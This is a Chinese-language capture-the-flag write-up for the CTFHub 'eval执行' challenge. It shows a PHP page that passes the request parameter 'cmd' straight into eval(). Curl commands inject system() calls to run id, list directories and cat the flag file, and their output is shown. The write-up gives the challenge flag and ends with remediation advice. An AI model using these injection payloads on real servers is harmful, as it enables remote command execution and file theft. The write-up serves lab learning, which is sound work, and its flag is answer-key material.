CTFHub - Web - RCE - eval执行

# CTFHub # Web # RCE # eval # 代码执行

一、题目信息

  • 题目名称：eval执行
  • 题目方向：Web - RCE
  • 运行环境：PHP 5.6.40
  • 题目目标：利用 eval() 代码注入执行系统命令，读取服务器上的 Flag 文件。

二、漏洞分析

访问题目首页时，页面通过 highlight_file() 暴露了完整源码：

<?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST["cmd"]);
} else {
    highlight_file(__FILE__);
}
?>

$_REQUEST["cmd"] 未经任何过滤便传入 eval()，可以执行任意 PHP 代码。参数同时支持 GET、POST 和 Cookie 传入，因此只需编写 PHP 代码并调用 system()、shell_exec() 等函数即可执行系统命令。

三、解题步骤

  1. 验证代码执行：传入 system('id');，确认当前 Web 服务账户权限。 
    curl.exe -sS --data-urlencode "cmd=system('id');" \
  "http://<challenge-host>:10800/"
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
  2. 查看当前目录：使用 pwd 和 ls -la 检查 Web 目录。 
    curl.exe -sS --data-urlencode "cmd=system('pwd; ls -la');" \
  "http://<challenge-host>:10800/"
    /var/www/html
total 12
drwxrwxrwx 1 www-data www-data 4096 Jul 18  2020 .
drwxr-xr-x 1 root     root     4096 Jan 23  2019 ..
-rw-r--r-- 1 www-data www-data  108 Jul 18  2020 index.php
  3. 查找 Flag：检查根目录，发现题目生成的 Flag 文件 /flag_4934。 
    curl.exe -sS --data-urlencode "cmd=system('ls -la /');" \
  "http://<challenge-host>:10800/"
  4. 读取 Flag：使用 cat 读取目标文件。 
    curl.exe -sS --data-urlencode "cmd=system('cat /flag_4934');" \
  "http://<challenge-host>:10800/"

四、最终 Flag

ctfhub{ab87a9b38e4fc6a37116a6f8}

五、修复建议

  • 禁止动态执行代码：不要将用户输入传入 eval()、assert() 等代码执行函数，优先使用固定白名单逻辑。
  • 过滤危险函数：若业务无法避免动态执行，应严格限制输入字符和可调用函数，禁用 system()、shell_exec() 等系统命令函数。
  • 最小权限：降低 Web 服务账户权限，限制其读取系统敏感文件和执行外部命令的能力。
  • 关闭错误与源码回显：生产环境应关闭源码高亮和详细错误输出，避免泄露实现细节。
